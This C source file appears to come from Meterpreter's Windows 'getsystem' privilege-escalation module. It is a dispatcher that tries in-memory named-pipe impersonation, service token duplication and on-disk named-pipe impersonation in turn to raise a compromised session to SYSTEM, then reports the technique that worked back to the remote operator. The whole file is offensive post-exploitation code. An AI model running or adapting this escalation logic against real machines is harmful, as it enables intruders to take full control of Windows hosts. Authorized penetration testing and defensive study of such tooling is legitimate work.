#include "precomp.h"
#include "namedpipe.h"
#include "tokendup.h"

/*
 * Attempt to elevate the current meterpreter to local system using a variety of techniques.
 */
DWORD elevate_getsystem( Remote * remote, Packet * packet )
{
	DWORD dwResult    = ERROR_SUCCESS;
	DWORD dwTechnique = ELEVATE_TECHNIQUE_ANY;
	Packet * response = NULL;

	do
	{
		response = packet_create_response( packet );
		if( !response )
			BREAK_WITH_ERROR( "[ELEVATE] get_system. packet_create_response failed", ERROR_INVALID_HANDLE );

		dwTechnique = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_TECHNIQUE );
		
		// if we are to to use ELEVATE_TECHNIQUE_ANY, we try everything at our disposal...
		if( dwTechnique == ELEVATE_TECHNIQUE_ANY )
		{
			do
			{
				// firstly, try to use the in-memory named pipe impersonation technique
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE;
				dwResult    = elevate_via_service_namedpipe( remote, packet );
				if( dwResult == ERROR_SUCCESS )
					break;

				// secondly, try to use the in-memory service token duplication technique (requires SeDebugPrivilege)
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_TOKENDUP;
				dwResult    = elevate_via_service_tokendup( remote, packet );
				if( dwResult == ERROR_SUCCESS )
					break;

				// thirdly, try to use the touching disk named pipe impersonation technique
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2;
				dwResult    = elevate_via_service_namedpipe2( remote, packet );
				if( dwResult == ERROR_SUCCESS )
					break;

			} while( 0 );
		}
		else
		{
			// if we are to only use a specific technique, try the specified one and return the success...
			switch( dwTechnique )
			{
				case ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE:
					dwResult = elevate_via_service_namedpipe( remote, packet );
					break;
				case ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2:
					dwResult = elevate_via_service_namedpipe2( remote, packet );
					break;
				case ELEVATE_TECHNIQUE_SERVICE_TOKENDUP:
					dwResult = elevate_via_service_tokendup( remote, packet );
					break;
				default:
					dwResult = ERROR_CALL_NOT_IMPLEMENTED;
					break;
			}
		}

	} while( 0 );

	if( response )
	{
		if( dwResult == ERROR_SUCCESS )
			packet_add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE, dwTechnique );
		else
			packet_add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE, ELEVATE_TECHNIQUE_NONE );

		packet_transmit_response( dwResult, remote, response );
	}

	return dwResult;
}
